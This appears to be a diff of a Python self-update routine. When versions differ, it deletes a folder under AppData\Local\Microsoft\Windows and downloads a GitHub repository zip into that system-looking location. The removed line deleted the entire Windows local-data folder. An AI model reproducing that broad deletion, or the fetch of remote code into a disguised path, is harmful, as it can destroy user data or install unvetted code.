@@ -23,7 +23,7 @@ with open(os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Windows',
 if ver2 == ver1:
     pass
 else:
-    shutil.rmtree(os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Windows'))
+    shutil.rmtree(os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Windows', 'skibidi-main'))
     target_path = os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Windows')
     r = requests.get("https://github.com/skibidi-123456/skibidi/archive/refs/heads/main.zip", allow_redirects=True)
     file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skibidi-main.zip')
